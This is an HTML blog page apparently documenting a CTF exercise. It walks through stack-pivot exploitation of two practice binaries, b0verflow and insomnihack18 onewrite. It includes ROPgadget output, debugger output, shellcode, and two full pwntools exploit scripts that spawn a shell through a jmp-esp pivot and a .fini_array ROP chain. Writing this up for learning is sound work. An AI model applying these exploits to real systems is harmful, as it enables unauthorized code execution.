@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+		
+		<title>stack pivot - Yuuoniy&#39;s blog</title>
+		
+		<meta name="description" content="xctf16_b0verflow checksec:
+[*] &#39;/home/yuuoniy/MY-AEG/nightmare/modules/17-stack_pivot/xctf16_b0verflow/b0verflow&#39;Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX disabledPIE: No PIE (0x8048000)RWX: Has RWX segmentsObviously, there is a stack overflow, while the overflow buffer only is 18 byte. as a result, we could utilize stack pivot technique.
+we could place our shellcode on string s, then jump to here. so we need a jmp gadget. and hint() has this! (we could also use tool to find it)">
+		<meta name="author" content="">
+		<meta name="generator" content="hugo-plains https://gitlab.com/hugo-plains/hugo-plains">
+		
+		<link href="https://blog.yuuoniy.cn/an-old-hope.min.css" rel="stylesheet">
+		<link href="https://blog.yuuoniy.cn/style.css" rel="stylesheet">
+		<link href="https://blog.yuuoniy.cn/custom.css" rel="stylesheet">
+		
+		<link rel="apple-touch-icon" href="https://blog.yuuoniy.cn/apple-touch-icon.png">
+		<link rel="icon" href="https://blog.yuuoniy.cn/favicon.ico">
+		<meta name="generator" content="Hugo 0.76.5" />
+		
+		
+		
+		<script>
+			function setTheme() {
+				if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+					document.body.classList.add('dark');
+					return;
+				}
+				
+				let date = new Date();
+				let time = date.getTime();
+				let sunrise = date.setHours(7, 00); 
+				let sunset = date.setHours(20, 00); 
+
+				if (time < sunrise || time > sunset)
+					document.body.classList.add('dark');
+			}
+		</script>
+		
+	</head>
+	<body class="single">
+		
+		<script>
+			setTheme();
+			console.log("This site was made using Hugo and Plains. https://gohugo.io https://gitlab.com/hugo-plains/hugo-plains");
+		</script>
+		
+		<header class="header">
+			<nav class="nav">
+				<p class="logo"><a href="https://blog.yuuoniy.cn">Yuuoniy&#39;s blog</a></p>
+				<ul class="menu">
+					<li>
+						<a href="/posts/">Posts</a>
+					</li>
+					<li>
+						<a href="/tags/">Tags</a>
+					</li>
+					<li>
+						<a href="/about/">About</a>
+					</li>
+				</ul>
+			</nav>
+		</header>
+		<main class="main">
+
+
+<article class="post-single">
+	<header class="post-header">
+		<h1 class="post-title">stack pivot</h1>
+		<div class="post-meta">January 14, 2020</div>
+	</header>
+	<div class="post-content"><h2 id="xctf16_b0verflow">xctf16_b0verflow</h2>
+<p>checksec:</p>
+<pre><code>[*] '/home/yuuoniy/MY-AEG/nightmare/modules/17-stack_pivot/xctf16_b0verflow/b0verflow'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments
+</code></pre><p>Obviously, there is a stack overflow, while the overflow buffer only is 18 byte. as a result, we could utilize stack pivot technique.</p>
+<p>we could place our shellcode on string s, then jump to here. so we need a jmp gadget. and hint() has this! (we could also use tool to find it)</p>
+<pre><code>ROPgadget --binary b0verflow | grep &quot;sub esp&quot;
+0x080484fe : mov ebp, esp ; sub esp, 0x24 ; ret
+0x080484fd : push ebp ; mov ebp, esp ; sub esp, 0x24 ; ret
+0x08048500 : sub esp, 0x24 ; ret
+0x08048361 : sub esp, 8 ; call 0x8048439
+</code></pre><pre><code>16_b0verflow$ ROPgadget --binary b0verflow | grep &quot;jmp esp&quot;
+0x08048502 : and al, 0xc3 ; jmp esp
+0x08048501 : in al, dx ; and al, 0xc3 ; jmp esp
+0x080484ff : in eax, 0x83 ; in al, dx ; and al, 0xc3 ; jmp esp
+0x08048504 : jmp esp
+</code></pre><p>exp:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+t <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./b0verflow&#34;</span>)
+shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80</span><span style="color:#e6db74">&#34;</span>
+
+jmp_esp <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x08048504</span>)
+pivot <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x080484fd</span>)
+
+payload <span style="color:#f92672">=</span> jmp_esp<span style="color:#f92672">+</span>shellcode<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x20</span><span style="color:#f92672">-</span>len(shellcode))<span style="color:#f92672">+</span>pivot
+
+t<span style="color:#f92672">.</span>sendline(payload)
+t<span style="color:#f92672">.</span>interactive()
+</code></pre></div><h1 id="insomnihack-2018-onewrite">insomnihack 2018 onewrite</h1>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">[<span style="color:#f92672">*</span>] <span style="color:#e6db74">&#39;/home/yuuoniy/Desktop/MY-AEG/nightmare/modules/17-stack_pivot/insomnihack18_onewrite/onewrite&#39;</span>
+    Arch:     amd64<span style="color:#f92672">-</span><span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+</code></pre></div><p>first analyze the binary, and we have the ability to do leak and overwrite, however, only one time is allowed.</p>
+<p>ideas:</p>
+<ol>
+<li>do partially overwrite to call do_leak multiple times.</li>
+<li>utilize rop chain to overwrite .fini_array</li>
+</ol>
+<p>for the first time, we leak stack address.</p>
+<p>set a breakpoint in do_leak return, and we could get the offset to overwrite the return address</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">pwndbg<span style="color:#f92672">&gt;</span> i f
+Stack level <span style="color:#ae81ff">0</span>, frame at <span style="color:#ae81ff">0x7fffffffdb28</span>:
+ rip <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7d52ab7</span> <span style="color:#f92672">in</span> do_leak; saved rip <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffff7d52b09</span>
+ called by frame at <span style="color:#ae81ff">0x7fffffffdb40</span>
+ Arglist at <span style="color:#ae81ff">0x7fffffffdb20</span>, args: 
+ Locals at <span style="color:#ae81ff">0x7fffffffdb20</span>, Previous frame<span style="color:#e6db74">&#39;s sp is 0x7fffffffdb30</span>
+ Saved registers:
+  rip at <span style="color:#ae81ff">0x7fffffffdb28</span>
+</code></pre></div><p>offset = 0x7fffffffdb28-address we leak = 0x18</p>
+<pre><code>.text:0000000000008B04                 call    do_leak
+.text:0000000000008B09                 nop
+</code></pre><p>overwrite 09 to 04, then we could call do_leak multiple times.</p>
+<p>after doing this, we could get both stack and PIE address.</p>
+<p>next, let&rsquo;s overwrite  .fini_array</p>
+<pre><code>0x00007ffff7ff7fb0 - 0x00007ffff7ff7fc0 is .fini_array
+</code></pre><p>let&rsquo;s see the content in .fini_array, there are two entries, one we overwrite by  __libc_csu_fini , the other by the address we want.</p>
+<p>we need to construct a rop chain like this:</p>
+<pre><code>pop rdi ptr to &quot;/bin/sh&quot;;   ret
+pop rsi 0 ; ret
+pop rdx 0 ; ret
+pop rax 0x59 ; ret
+syscall
+</code></pre><p>using tool to find gadgets:</p>
+<pre><code>0x00000000000084fa : pop rdi ; ret
+0x000000000000d9f2 : pop rsi ; ret
+0x00000000000484c5 : pop rdx ; ret
+0x00000000000460ac : pop rax ; ret
+0x000000000000917c : syscall
+</code></pre><p>and use add rsp gadget to pivot the stack, then execute our rop chain.</p>
+<p>so we need to calculate the offset between the stack address we leak and value of rsp when gadget is executed.</p>
+<p>next we also need to write &lsquo;bin/sh&rsquo; to .bss,  calculate the offset by</p>
+<p>p address_of_bss - pie_address_we_leak</p>
+<p>then we get the offset.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./onewrite&#39;</span>)
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;onewrite&#39;</span>)
+context<span style="color:#f92672">.</span>terminal<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;tmux&#34;</span>,<span style="color:#e6db74">&#34;splitw&#34;</span>,<span style="color:#e6db74">&#34;-h&#34;</span>]
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak</span>(opt):
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;&gt;&#39;</span>)
+    p<span style="color:#f92672">.</span>sendline(str(opt))
+    leak<span style="color:#f92672">=</span>p<span style="color:#f92672">.</span>recvline()
+    leak <span style="color:#f92672">=</span> int(leak,<span style="color:#ae81ff">16</span>)
+    <span style="color:#66d9ef">return</span> leak
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">write</span>(addr,value):
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;address :&#34;</span>)
+    p<span style="color:#f92672">.</span>send(str(addr))
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;data :&#34;</span>)
+    p<span style="color:#f92672">.</span>send(value)
+
+
+stack_address <span style="color:#f92672">=</span> leak(<span style="color:#ae81ff">1</span>)
+rip_addr <span style="color:#f92672">=</span> stack_address<span style="color:#f92672">+</span><span style="color:#ae81ff">0x18</span>
+csu_fini_rip <span style="color:#f92672">=</span> stack_address<span style="color:#f92672">-</span><span style="color:#ae81ff">72</span>
+
+write(rip_addr,p8(<span style="color:#ae81ff">0x4</span>))
+do_leak_addr <span style="color:#f92672">=</span> leak(<span style="color:#ae81ff">2</span>)
+
+pie_base <span style="color:#f92672">=</span> do_leak_addr<span style="color:#f92672">-</span>elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;do_leak&#39;</span>]
+fini_array_addr <span style="color:#f92672">=</span> pie_base<span style="color:#f92672">+</span>elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;__do_global_dtors_aux_fini_array_entry&#39;</span>]
+csu_fini<span style="color:#f92672">=</span>pie_base<span style="color:#f92672">+</span>elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;__libc_csu_fini&#34;</span>]
+do_overwrite <span style="color:#f92672">=</span> pie_base<span style="color:#f92672">+</span>elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;do_overwrite&#39;</span>]
+   
+write(rip_addr,p8(<span style="color:#ae81ff">0x4</span>))
+leak(<span style="color:#ae81ff">1</span>)
+
+write(fini_array_addr<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>,p64(do_overwrite))
+write(fini_array_addr,p64(do_overwrite))
+write(csu_fini_rip,p64(csu_fini))
+
+csu_fini_rip<span style="color:#f92672">+=</span><span style="color:#ae81ff">8</span>
+
+pop_rdi <span style="color:#f92672">=</span> pie_base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x084fa</span>
+pop_rsi <span style="color:#f92672">=</span> pie_base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x0d9f2</span>
+pop_rdx <span style="color:#f92672">=</span> pie_base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x0484c5</span>
+pop_rax <span style="color:#f92672">=</span> pie_base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x460ac</span>
+syscall <span style="color:#f92672">=</span> pie_base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x917c</span>
+binsh_addr <span style="color:#f92672">=</span> do_leak_addr<span style="color:#f92672">+</span><span style="color:#ae81ff">0x2aa99b</span>
+pivot_gadget <span style="color:#f92672">=</span> pie_base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x106f3</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">write_qword</span>(addr,val):
+    <span style="color:#66d9ef">global</span> csu_fini_rip
+    write(addr,p64(val))
+    write(csu_fini_rip,p64(csu_fini))
+    csu_fini_rip<span style="color:#f92672">+=</span><span style="color:#ae81ff">8</span>
+
+<span style="color:#75715e">#gdb.attach(p)</span>
+write_qword(binsh_addr,u64(<span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+
+write_qword(stack_address<span style="color:#f92672">+</span><span style="color:#ae81ff">0xd0</span>,pop_rdi)
+write_qword(stack_address<span style="color:#f92672">+</span><span style="color:#ae81ff">0xd8</span>,binsh_addr)
+write_qword(stack_address<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe0</span>,pop_rsi)
+write_qword(stack_address<span style="color:#f92672">+</span><span style="color:#ae81ff">0xe8</span>,<span style="color:#ae81ff">0</span>)
+write_qword(stack_address<span style="color:#f92672">+</span><span style="color:#ae81ff">0xf0</span>,pop_rdx)
+write_qword(stack_address<span style="color:#f92672">+</span><span style="color:#ae81ff">0xf8</span>,<span style="color:#ae81ff">0</span>)
+write_qword(stack_address<span style="color:#f92672">+</span><span style="color:#ae81ff">0x100</span>,pop_rax)
+write_qword(stack_address<span style="color:#f92672">+</span><span style="color:#ae81ff">0x108</span>,<span style="color:#ae81ff">59</span>)
+write_qword(stack_address<span style="color:#f92672">+</span><span style="color:#ae81ff">0x110</span>,syscall)
+write(stack_address<span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span>,p64(pivot_gadget))
+
+p<span style="color:#f92672">.</span>interactive()
+
+</code></pre></div><p>reference:</p>
+<p><a href="https://github.com/guyinatuxedo/nightmare/blob/master/modules/17-stack_pivot/insomnihack18_onewrite/readme.md">https://github.com/guyinatuxedo/nightmare/blob/master/modules/17-stack_pivot/insomnihack18_onewrite/readme.md</a></p>
+</div>
+	
+</article></main>
+<footer class="footer">
+	<span>
+		Copyright © 2020–2020, Yuuoniy and the Hugo Authors; all rights reserved.
+		
+	</span>
+	<span>&middot;</span>
+	<span>Powered by <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>️ and <a href="https://gitlab.com/hugo-plains/hugo-plains" rel="noopener" target="_blank">Plains</a></span>
+</footer>
+<script src="https://blog.yuuoniy.cn/highlight.min.js"></script>
+<script>
+	hljs.initHighlightingOnLoad();
+</script>
+</body>
+</html>
+
